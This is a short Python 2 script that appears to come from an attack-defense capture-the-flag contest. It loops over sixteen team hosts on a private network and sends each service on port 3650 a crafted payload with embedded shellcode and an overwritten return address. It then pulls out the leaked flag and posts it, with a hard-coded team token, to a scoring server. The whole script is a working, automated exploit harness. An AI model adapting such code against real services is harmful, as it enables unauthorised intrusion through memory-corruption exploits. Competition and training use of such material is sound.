
import socket, struct, re, time, httplib

def sendkey(key):
    conn = httplib.HTTPConnection("10.217.0.100")
    conn.request("GET", "/team/submit_key?token=7d6251fc73922705186fa2eb5bba3e60&key=%s" % (key))
    r1 = conn.getresponse()
    print r1.read()

def W(sc, x):
	sc.send(x)
	time.sleep(0.3)

def R(sc):
	return sc.recv(40960)

while True:
    for i in range(1, 17):
        sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        sc.settimeout(5)
        print i
        try:
            sc.connect(('10.217.%d.201'%i, 3650))
            W(sc,"2\n$?\n")
            t = R(sc)
            W(sc,"3\n")
            W(sc,t[:-1]+"McCJw4nBsasB4YnCsASzAbIgzYCwAc2AAA==\n111122223333i\xc3\x04\x08\x0a")
            key = R(sc)
            print [key[18:]], len(key[18:])
            print sendkey(key[18:])
        except:
            pass
    time.sleep(60)
